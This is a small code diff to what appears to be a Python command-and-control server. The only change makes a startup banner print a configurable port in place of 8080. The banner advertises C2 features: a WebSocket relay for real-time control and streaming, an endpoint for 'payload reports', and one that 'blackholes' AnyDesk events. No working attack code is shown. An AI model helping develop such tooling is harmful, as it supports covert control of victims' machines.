@@ -896,7 +896,7 @@ def start_fastapi_server():
 if __name__ == "__main__":
     print("\n[ C2 Server - HTTP/WebSocket Relay ]\n")
     print("Features:")
-    print("  • HTTP API (port 8080) - Command & Control")
+    print(f"  • HTTP API (port {FASTAPI_PORT}) - Command & Control")
     print("  • WebSocket Relay - Real-time control and streaming")
     print("  • POST /report - Anytime payload reports")
     print("  • POST /anydesk_event - Blackhole AnyDesk events")
